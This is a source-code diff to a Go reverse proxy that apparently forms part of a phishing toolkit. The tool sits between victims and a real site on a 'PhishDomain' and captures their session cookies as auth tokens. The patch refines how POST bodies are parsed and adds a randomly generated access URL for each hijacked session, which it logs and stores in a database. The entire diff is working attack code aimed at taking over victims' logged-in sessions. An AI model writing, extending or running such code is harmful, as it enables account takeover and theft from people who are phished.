@@ -731,7 +731,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-						} else if form_re.MatchString(contentType) {
+						} else if form_re.MatchString(contentType) && !strings.HasPrefix(string(body), "[") { //去掉json数组 by xwj
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -960,7 +960,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
-								s.SetAccessURL(ps.PhishDomain)
+								// set Access url for session
+								accessUrl := p.genAccessUrl(ps.PhishDomain)
+								p.setSessionAccessUrl(ps.SessionId, accessUrl)
+								log.Success("[%d] AccessUrl: [%s]", ps.Index, accessUrl)
+								if err := p.db.SetSessionAccessUrl(ps.SessionId, accessUrl); err != nil {
+									log.Error("database: %v", err)
+								}
 							}
 						}
 					}
@@ -1618,6 +1624,16 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	}
 }
 
+func (p *HttpProxy) setSessionAccessUrl(sid string, url string) {
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetAccessURL(url)
+	}
+}
+
 func (p *HttpProxy) httpsWorker() {
 	var err error
 
@@ -1962,6 +1978,11 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 	return nil
 }
 
+func (p *HttpProxy) genAccessUrl(url string) string {
+	accessUrl := url + "/" + GenRandomString(8)
+	return accessUrl
+}
+
 type dumbResponseWriter struct {
 	net.Conn
 }
@@ -2009,3 +2030,4 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
+
